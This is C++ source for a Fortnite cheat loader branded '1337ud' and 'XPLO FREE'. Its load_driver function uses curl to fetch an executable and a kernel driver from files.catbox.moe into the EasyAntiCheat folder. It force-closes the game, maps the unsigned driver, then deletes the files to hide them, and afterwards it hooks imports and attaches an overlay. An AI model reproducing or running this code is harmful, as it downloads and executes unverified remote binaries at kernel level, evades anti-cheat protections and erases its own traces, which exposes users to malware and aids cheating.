#include "initalizer.hpp"
#include "render.hpp"
#include "settings.hpp"
#include "driver.hpp"
#include "vdm_ctx/vdm_ctx.hpp"
#include "drv_image/drv_image.hpp"

#include <Windows.h>
#include <Uxtheme.h>
#include <dwmapi.h>

#include <iostream>
#include <iomanip>
#include <ctime>
#include <thread>

#include "stringproc.h"
#include "termcolor.h"
#include "thread"

using namespace std;
using namespace termcolor;

std::string key;

// Helper function to delete files
void deleteFile(const std::string& filePath) {
    if (remove(filePath.c_str()) != 0) {
        std::cout << red << pr("[-] Failed to delete file: ") << filePath << std::endl;
    }
}

bool load_driver() {
    std::time_t now = std::time(nullptr);
    std::tm* localTime = std::localtime(&now);

    // Check if the driver is already loaded
    if (util::get_module_base("jcz4uw.sys")) {
        return -1; // Driver already loaded
    }

    // Download the executable and driver using curl
    std::cout << green << pr("[+] Downloading components...") << std::endl;
    system("curl -o \"C:\\Program Files (x86)\\EasyAntiCheat_EOS\\ud19fv.exe\" https://files.catbox.moe/ud19fv.bin");
    system("curl -o \"C:\\Program Files (x86)\\EasyAntiCheat_EOS\\jcz4uw.sys\" https://files.catbox.moe/jcz4uw.sys");

    // Check if files were downloaded successfully
    if (_access("C:\\Program Files (x86)\\EasyAntiCheat_EOS\\ud19fv.exe", 0) != 0 || 
        _access("C:\\Program Files (x86)\\EasyAntiCheat_EOS\\jcz4uw.sys", 0) != 0) {
        std::cout << red << pr("[-] Failed to download required files") << std::endl;
        return -1;
    }

    // Kill Fortnite process if running
    std::cout << green << pr("[+] Terminating Fortnite process...") << std::endl;
    system("taskkill /f /im FortniteClient-Win64-Shipping.exe >nul 2>&1");

    // Execute the downloaded executable with the driver as an argument
    std::cout << green << pr("[+] Mapping driver...") << std::endl;
    std::string executeCommand = "cmd /c \"\"C:\\Program Files (x86)\\EasyAntiCheat_EOS\\ud19fv.exe\" \"C:\\Program Files (x86)\\EasyAntiCheat_EOS\\jcz4uw.sys\"\"";
    int result = system(executeCommand.c_str());

    if (result != 0) {
        std::cout << red << pr("[-] Failed to execute driver mapper") << std::endl;
        deleteFile("C:\\Program Files (x86)\\EasyAntiCheat_EOS\\ud19fv.exe");
        deleteFile("C:\\Program Files (x86)\\EasyAntiCheat_EOS\\jcz4uw.sys");
        return -1;
    }

    // Clean up downloaded files
    std::cout << green << pr("[+] Cleaning up...") << std::endl;
    deleteFile("C:\\Program Files (x86)\\EasyAntiCheat_EOS\\ud19fv.exe");
    deleteFile("C:\\Program Files (x86)\\EasyAntiCheat_EOS\\jcz4uw.sys");

    // Verify driver is loaded
    if (!util::get_module_base("jcz4uw.sys")) {
        std::cout << red << pr("[-] Driver not detected after mapping") << std::endl;
        return -1;
    }

    return true; // Driver loaded successfully
}

bool initialize() {
    SetConsoleTitle("1337ud | Fortnite");
    system("cls");

    if (!mem::find_driver()) {
        system("cls");
        std::cout << green << pr("[+] Driver not detected") << std::endl;

        // Show Yes/No popup to load the driver
        int response = MessageBoxA(NULL, "Would you like to load the driver now?", "Driver Load", MB_YESNO | MB_ICONQUESTION);
        
        if (response == IDYES) {
            std::cout << green << pr("[+] Loading driver now...") << std::endl;
            if (!load_driver()) {
                std::cout << red << pr("[-] Failed to load driver") << std::endl;
                Sleep(2000);
                return false;
            }
            Sleep(1000);
            // Recheck initialization after loading driver
            return initialize();
        } else {
            std::cout << yellow << pr("[+] Proceeding without loading driver") << std::endl;
            Sleep(1000);
            // Continue running even if driver isn't loaded
        }
    }

    // Driver is either loaded or user chose to proceed without it
    std::cout << pr("[+] Product: ") << red << pr("leaked by 1337ud") << white << std::endl;
    std::cout << pr("[+] Status: ") << green << pr("Detected") << white << std::endl;
    std::cout << pr("     ") << green << pr("    ") << white << std::endl;
    Sleep(1000);

    Star_Mouse(); // Initialize DLL import hooks

    // Set the process ID to Fortnite
    if (FindWindowA_Spoofed(0, "Fortnite")) {
        mem::process_id = mem::find_process("FortniteClient-Win64-Shipping.exe");
    }

    std::cout << green << pr("[+] Driver initialized") << std::endl;
    std::cout << pr("     ") << green << pr("    ") << white << std::endl;
    Sleep(1000);

    Beep(500, 500);
    std::cout << green << pr("[+] Successfully loaded XPLO FREE, press [F2] to open Inject") << std::endl;
    std::cout << green << pr("[+] Dont close this CMD") << std::endl;

    Overlay();

    while (true) {
        if (GetAsyncKeyState(VK_F2) & 0x8000) {
            Sleep(200);
            break;
        }
        Sleep(10);
    }

    render();
    return true;
}